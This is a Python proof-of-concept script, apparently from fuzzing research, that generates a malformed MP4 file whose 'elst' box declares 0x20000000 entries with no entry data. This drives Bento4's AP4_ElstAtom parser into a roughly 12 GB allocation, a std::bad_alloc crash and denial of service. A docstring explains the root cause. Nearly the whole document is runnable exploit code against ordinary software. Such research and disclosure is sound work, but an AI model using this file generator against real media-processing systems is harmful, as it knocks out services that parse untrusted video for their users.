#!/usr/bin/env python3
"""
VULN 001 PoC Generator: Integer Overflow in EnsureCapacity via Crafted elst entry_count
Location: AP4_ElstAtom constructor (Ap4ElstAtom.cpp:72-73) + AP4_Array::EnsureCapacity (Ap4Array.h:172)

Root cause:
  entry_count is read from the elst box with no bounds check, then
  m_Entries.EnsureCapacity(entry_count) is called (return value ignored).
  In 64-bit builds: 0x20000000 * sizeof(AP4_ElstEntry) = 0x20000000 * 24 = ~12 GB,
  causing ::operator new to throw std::bad_alloc -> crash/DoS.

Structure:
  ftyp (16 bytes)
  moov
    trak
      edts
        elst: version=0, flags=0, entry_count=0x20000000, NO actual entries
"""

import struct
import os

OUTFILE = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4ElstAtom_cpp/vuln_001.mp4"

def make_box(type_str, payload=b""):
    """Build a box: 4-byte size (big-endian) + 4-byte ASCII type + payload."""
    size = 8 + len(payload)
    return struct.pack(">I", size) + type_str.encode("ascii") + payload

def make_fullbox(type_str, version, flags, payload=b""):
    """Build a FullBox: box header + 1-byte version + 3-byte flags + payload."""
    flags_bytes = struct.pack(">I", flags & 0xFFFFFF)[1:]  # 3 bytes
    fb_payload = struct.pack(">B", version) + flags_bytes + payload
    return make_box(type_str, fb_payload)

# ftyp box: size=16, type='ftyp', major_brand='isom', minor_version=0
ftyp_payload = b"isom" + struct.pack(">I", 0)  # major_brand + minor_version
ftyp = make_box("ftyp", ftyp_payload)
assert len(ftyp) == 16, f"ftyp size mismatch: {len(ftyp)}"

# elst box: version=0, flags=0x000000, entry_count=0x20000000, NO entry data
# Total: 8 (box header) + 4 (version+flags) + 4 (entry_count) = 16 bytes
TRIGGER_ENTRY_COUNT = 0x20000000
elst_payload = struct.pack(">I", TRIGGER_ENTRY_COUNT)  # entry_count only, no entries
elst = make_fullbox("elst", 0, 0, elst_payload)
assert len(elst) == 16, f"elst size mismatch: {len(elst)}"

# edts container box: holds the elst box
edts = make_box("edts", elst)

# trak container box: holds the edts box
trak = make_box("trak", edts)

# moov container box: holds the trak box
moov = make_box("moov", trak)

# Final MP4: ftyp + moov
mp4_data = ftyp + moov

os.makedirs(os.path.dirname(OUTFILE), exist_ok=True)
with open(OUTFILE, "wb") as f:
    f.write(mp4_data)

sizeof_AP4_ElstEntry = 24  # AP4_UI64(8) + AP4_SI64(8) + AP4_UI16(2) + 6 bytes padding = 24
alloc_size = TRIGGER_ENTRY_COUNT * sizeof_AP4_ElstEntry

print(f"Written {len(mp4_data)} bytes to {OUTFILE}")
print(f"elst entry_count = 0x{TRIGGER_ENTRY_COUNT:08X} ({TRIGGER_ENTRY_COUNT})")
print(f"EnsureCapacity will call: ::operator new(0x{TRIGGER_ENTRY_COUNT:X} * {sizeof_AP4_ElstEntry})")
print(f"  = ::operator new({alloc_size}) = ~{alloc_size / (1024**3):.1f} GB")
print(f"  On 64-bit: throws std::bad_alloc -> crash/DoS")
